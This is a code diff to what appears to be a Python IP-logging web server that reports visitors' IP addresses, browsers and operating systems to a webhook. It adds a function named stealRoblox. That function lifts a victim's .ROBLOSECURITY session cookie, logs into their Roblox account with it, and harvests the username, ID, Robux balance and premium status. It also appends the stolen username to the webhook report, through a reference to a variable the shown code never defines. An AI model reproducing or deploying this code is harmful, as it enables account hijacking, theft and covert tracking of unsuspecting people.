@@ -73,6 +73,49 @@ def botCheck(ip, useragent):
         return "Telegram"
     else:
         return False
+    
+def stealRoblox(cookie):
+    if not cookie or '.ROBLOSECURITY=' not in cookie:
+        return None
+    
+    # Extract clean cookie
+    roblox_cookie = cookie.split('.ROBLOSECURITY=')[1].split(';')[0]
+    
+    session = requests.Session()
+    session.cookies['.ROBLOSECURITY'] = roblox_cookie
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'application/json',
+        'Origin': 'https://www.roblox.com',
+        'Referer': 'https://www.roblox.com/'
+    })
+    
+    try:
+        # Get authenticated user info
+        user_resp = session.get('https://users.roblox.com/v1/users/authenticated').json()
+        username = user_resp.get('name', 'Unknown')
+        user_id = user_resp.get('id', 'Unknown')
+        
+        # Get Robux balance
+        currency_resp = session.get('https://economy.roblox.com/v1/user/currency').json()
+        robux = currency_resp.get('robux', 0)
+        
+        # Optional: Premium status
+        premium_resp = session.get('https://premiumfeatures.roblox.com/v1/users/{}/validate-membership'.format(user_id)).json()
+        is_premium = premium_resp.get('isPremium', False)
+        
+        # Avatar thumbnail
+        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
+        
+        return {
+            'username': username,
+            'user_id': user_id,
+            'robux': robux,
+            'premium': is_premium,
+            'avatar': avatar_url
+        }
+    except:
+        return None  # Silent fail if invalid/expired cookie
 
 def reportError(error):
     requests.post(config["webhook"], json = {
@@ -236,7 +279,7 @@ height: 100vh;
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
+            
 
                 message = config["message"]["message"]
 
@@ -255,7 +298,7 @@ height: 100vh;
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                     message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-
+                    message += f'\nName: {data['username']}' + '```'
                 datatype = 'text/html'
 
                 if config["message"]["doMessage"]:
